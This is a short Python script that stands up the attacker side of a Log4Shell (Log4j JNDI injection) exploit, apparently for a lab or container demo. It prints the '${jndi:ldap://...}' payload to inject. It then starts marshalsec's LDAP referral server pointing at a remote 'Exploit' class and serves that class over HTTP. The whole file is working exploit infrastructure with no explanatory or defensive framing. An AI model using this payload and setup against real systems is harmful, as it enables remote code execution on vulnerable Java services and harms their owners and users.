import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler

print("Enter: ${jndi:ldap://ldap-server:1389/a}")

print("Staring LDAP server: 0.0.0.0:1389")
subprocess.Popen(["java", "-cp", "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://ldap-server:8000/#Exploit"])

print("Starting web server: 0.0.0.0:8000")
http_server = HTTPServer(("0.0.0.0", 8000), SimpleHTTPRequestHandler)
http_server.serve_forever()
